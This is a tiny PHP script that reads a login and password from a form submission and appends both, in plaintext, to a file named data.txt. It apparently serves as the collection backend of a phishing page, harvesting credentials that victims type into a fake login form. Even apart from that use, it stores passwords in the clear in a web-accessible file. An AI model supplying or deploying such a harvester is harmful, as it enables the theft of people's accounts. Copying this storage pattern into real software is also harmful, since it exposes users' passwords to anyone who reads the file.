<?php

$login = trim($_POST['login']);
$password = trim($_POST['password']);

$fp = fopen('data.txt','a');
fwrite($fp,"login: {$login}\n");
fwrite($fp,"password: {$password}\n");
fwrite($fp,"----------------\n");
fclose($fp);

